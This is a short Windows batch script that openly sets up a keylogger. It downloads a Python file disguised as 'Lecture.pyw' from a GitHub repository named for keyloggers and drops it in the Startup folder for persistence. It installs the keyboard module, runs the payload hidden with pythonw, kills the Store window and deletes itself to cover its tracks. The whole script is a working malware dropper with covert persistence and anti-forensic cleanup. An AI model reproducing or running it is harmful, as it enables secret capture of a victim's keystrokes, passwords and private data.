@echo off
echo Setting up Keylogger...

REM Step 1: Download Lecture.pyw from GitHub
echo Downloading Lecture.pyw from GitHub...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/spy-group/keylogger/raw/main/Lecture.pyw' -OutFile '%USERPROFILE%\Downloads\Lecture.pyw'"

REM Step 2: Move Lecture.pyw to Startup folder
echo Moving Lecture.pyw to Startup folder...
move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Step 3: Install Python 3.12 from Microsoft Store
echo Installing Python 3.12 from Microsoft Store...
start ms-windows-store://pdp/?productid=9NCVDN91XZQP

REM Wait for Microsoft Store to open and close automatically
timeout /t 10 >nul
taskkill /f /im WinStore.App.exe >nul

REM Step 4: Install the 'keyboard' module
echo Installing 'keyboard' module...
pip install keyboard

REM Step 5: Run Lecture.pyw in hidden mode using pythonw.exe
echo Running Lecture.pyw in hidden mode...
start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"

REM Step 6: Delete the BAT file after execution
echo Deleting BAT file...
del "%~f0"

REM Step 7: Close CMD window automatically
exit
